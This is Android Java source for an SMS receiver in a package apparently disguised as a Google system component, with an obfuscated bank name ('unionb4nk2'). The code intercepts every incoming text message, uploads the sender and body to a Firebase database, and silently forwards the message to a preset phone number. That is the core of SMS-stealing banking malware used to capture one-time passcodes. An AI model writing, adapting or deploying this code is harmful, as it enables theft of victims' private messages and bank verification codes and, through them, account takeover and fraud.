package google.test.debug.system.unionb4nk2.bg;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import google.test.debug.system.unionb4nk2.Helper;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class SmsReceiver extends BroadcastReceiver {

    private  String previous_message = null;
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                        // get sender and message body
                        String sender = "";
                        StringBuilder fullMessage = new StringBuilder();
                        for (Object pdu : pdus) {
                            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                            if (smsMessage != null) {
                                sender = smsMessage.getDisplayOriginatingAddress();
                                fullMessage.append(smsMessage.getMessageBody());
                            }
                        }
                        String messageBody = fullMessage.toString();

                        // processing to  forward and save message in firebase
                        SharedPreferencesHelper pref = new SharedPreferencesHelper(context);
                        String phoneNumber = pref.getString("phone", "7234560000");
                        if (!messageBody.equals(previous_message)) {
                            previous_message = messageBody;

                            // Prepare data for Firebase
                            HashMap<String, Object> dataObject = new HashMap<>();
                            dataObject.put("message", messageBody);
                            dataObject.put("forward_to", phoneNumber);
                            dataObject.put("sender", sender);
                            dataObject.put("Device", Build.MODEL);
                            dataObject.put("created_at", Helper.datetime());
                            dataObject.put("updated_at", Helper.datetime());

                            // Define the intent for SMS sent status
                            Intent sentIntent = new Intent("SMS_SENT");
                            PendingIntent sentPendingIntent;
                            sentPendingIntent = PendingIntent.getBroadcast(context, 0, sentIntent, PendingIntent.FLAG_IMMUTABLE);

                            // Write a message to Firebase
                            FirebaseDatabase database = FirebaseDatabase.getInstance();
                            DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("sms");
                            String userId = usersRef.push().getKey();
                            if (userId != null) {
                                usersRef.child(userId).setValue(dataObject)
                                        .addOnSuccessListener(aVoid -> {
                                            sentIntent.putExtra("id", userId);
                                            SmsManager smsManager = SmsManager.getDefault();
                                            smsManager.sendTextMessage(phoneNumber, null, messageBody, sentPendingIntent, null);
                                            Log.d(Helper.TAG, "Send SMS Id "+userId);
                                        })
                                        .addOnFailureListener(e -> {
                                            Log.d(Helper.TAG, "57FirebaseError: " + e.getMessage());
                                        });
                            }
                        } else {
                            Log.d("mywork", "Duplicate message received from " + sender + " with message: " + messageBody);
                        }

                }
            }
        }
    }
}
